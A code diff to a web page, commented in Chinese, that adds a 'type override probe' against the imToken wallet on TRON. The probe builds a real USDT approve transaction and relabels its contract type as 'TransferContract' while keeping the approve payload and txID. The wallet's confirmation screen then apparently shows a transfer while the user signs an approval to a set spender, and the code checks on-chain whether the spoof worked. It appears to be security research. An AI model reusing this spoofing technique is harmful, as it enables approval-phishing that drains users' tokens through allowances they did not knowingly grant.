@@ -71,6 +71,7 @@
       <button class="btn btn-allowance" id="btnNodeDiag" style="background:#6c5ce7;">⑤ 节点解析诊断（直连 TronGrid·假签名·不上链）</button>
       <button class="btn btn-probe" id="btnProbeClean" style="background:#8e1a1a;">⑥ 干净分离探针（raw_data=干净transfer / hex=干净approve）</button>
       <button class="btn btn-probe" id="btnProbeGenuine" style="background:#b8860b;">⑦ 自洽approve探针（节点必过·真上链·人工核对UI）</button>
+      <button class="btn btn-probe" id="btnProbeTypeOverride" style="background:#7d3c98;">⑧ type覆盖探针（决定性：节点凭type还是type_url）</button>
       <button class="btn btn-allowance" id="btnQueryAgain" style="margin-top:6px; background:var(--orange); color:#000;">④ 再次查询 allowance（验证变化）</button>
     </div>
   </div>
@@ -818,6 +819,90 @@
     }
   }
 
+  // ==================== ⑧ type 字符串覆盖探针（决定性：节点凭 type 还是 type_url 定型？） ====================
+  // 取一笔真实 approve，仅把 raw_data.contract[0].type 改成 "TransferContract"；
+  // parameter(=approve 的 Any，type_url=TriggerSmartContract)、raw_data_hex、txID 全保持 approve 不变。
+  //   · imToken 确认页读 type 字符串 → 人工观察显示成什么
+  //   · imToken 签 txID(=approve 哈希，对应 type=31 的序列化)
+  //   · 节点重序列化 raw_data 验签：
+  //       - 若按 type 字符串定型(=1) → 哈希≠txID → SIGERROR（此路被节点堵死）
+  //       - 若按 parameter.type_url 定型(=31) → 哈希=txID → 验签过 → approve 上链 → WYSINWYS 成立
+  async function runProbeTypeOverride() {
+    if (!window.tronWeb || !window.tronWeb.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
+
+    log('══════════ type 覆盖探针（决定性） ══════════', 'warn');
+    log('真 approve，仅把 contract[0].type 改成 "TransferContract"；parameter/hex/txID 全保持 approve', 'warn');
+    log('═══════════════════════════════════════════════', 'warn');
+
+    try {
+      var contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+      var userHex = window.tronWeb.address.toHex(walletAddr);
+
+      var built = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        contractHex, 'approve(address,uint256)',
+        { feeLimit: 100000000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        userHex
+      );
+      if (!built.result || !built.result.result) { log('approve 构造失败', 'error'); return; }
+      var approveTx = built.transaction;
+      var origContract = approveTx.raw_data.contract[0];   // TriggerSmartContract + approve Any
+
+      log('[基底] 真 approve txID = ' + approveTx.txID, 'warn');
+      log('[基底] parameter.type_url = ' + (origContract.parameter && origContract.parameter.type_url), 'warn');
+      log('[基底] raw_data_hex 含 095ea7b3 = ' + (approveTx.raw_data_hex.indexOf('095ea7b3') !== -1), 'success');
+
+      // 仅改 type 字符串；parameter(approve Any)/hex/txID 保持 approve
+      var spoofContract = {
+        parameter: origContract.parameter,   // 仍是 approve 的 Any（type_url=TriggerSmartContract）
+        type: 'TransferContract'             // 仅此一处改动 → 喂给 imToken 显示层
+      };
+      var submitTx = {
+        visible: approveTx.visible,
+        txID: approveTx.txID,                                 // = approve 哈希（type=31 序列化）
+        raw_data: Object.assign({}, approveTx.raw_data, { contract: [spoofContract] }),
+        raw_data_hex: approveTx.raw_data_hex                  // = approve
+      };
+
+      log('[组装] contract[0].type = "TransferContract"（显示层） / parameter=approve Any（执行层）', 'warn');
+      log('[组装] txID/raw_data_hex 仍锚定 approve(type=31)', 'success');
+      log('★ 请看 imToken 弹窗：显示“转账 / 授权 / 合约调用 / 其它”？', 'warn');
+
+      var txid = await sendTx(submitTx, 'type 覆盖探针');
+      $('probeResultCard').style.display = 'block';
+      $('probeTxid').textContent = txid || '未获取';
+
+      if (txid) {
+        log('── 回链验证 contract.type（最多 ~16s）──', 'warn');
+        var onchainType = await fetchOnchainTypeRetry(txid, 4);
+        $('probeOnchainType').textContent = onchainType || '未确认';
+        if (onchainType === 'TriggerSmartContract') {
+          $('probeOnchainType').style.color = 'var(--red)';
+          $('probeVerdict').textContent = '🔴 WYSINWYS 成立！节点按 type_url 定型';
+          $('probeVerdict').style.color = 'var(--red)';
+          $('probeInfoBox').innerHTML = '节点忽略 type 字符串、按 parameter.type_url 定型并执行 approve；txID 仍自洽 → 验签通过、approve 上链。而 imToken 确认页读 type 字符串显示非 approve。<strong>同一份 raw_data 在显示层/执行层分叉 → 所见非所签坐实。</strong>';
+          $('probeInfoBox').style.color = 'var(--red)';
+          log('🔴 链上=approve，但 UI 按 type 字符串显示 → 显示/执行分叉成立', 'error');
+          await queryAndShowAllowance(false);
+        } else if (onchainType === 'TransferContract') {
+          $('probeOnchainType').style.color = 'var(--green)';
+          $('probeVerdict').textContent = '🟢 链上=transfer（异常，需复核 txID 来源）';
+          log('🟢 链上=transfer', 'success');
+        } else {
+          $('probeVerdict').textContent = '⚠️ 待确认';
+          log('链上暂未确认: ' + (onchainType || ''), 'warn');
+        }
+      } else {
+        log('未上链。若 SIGERROR(“not contained of permission”) → 节点按 type 字符串定型(=1)，', 'warn');
+        log('序列化哈希≠txID(approve) → 此路被节点堵死，type_url 覆盖不成立。', 'warn');
+        log('若 CONTRACT_VALIDATE → 节点按 type=1 建 Transfer 但 unpack approve Any 失败。', 'warn');
+      }
+    } catch (e) {
+      log('type 覆盖探针异常: ' + (e.message || e), 'error');
+    }
+  }
+
   // ==================== ⑤ 节点解析诊断（直连，不需签名） ====================
   // 用假签名直接 POST 给节点 broadcasttransaction，对比 3 种结构的“原始节点响应”。
   // 假签名必然验签失败，但能暴露节点【解析阶段】的行为：
@@ -935,6 +1020,7 @@
   $('btnNodeDiag').addEventListener('click', runNodeDiag);
   $('btnProbeClean').addEventListener('click', runProbeClean);
   $('btnProbeGenuine').addEventListener('click', runProbeGenuine);
+  $('btnProbeTypeOverride').addEventListener('click', runProbeTypeOverride);
   $('btnQueryAllowance').addEventListener('click', function() {
     queryAndShowAllowance(false);
   });
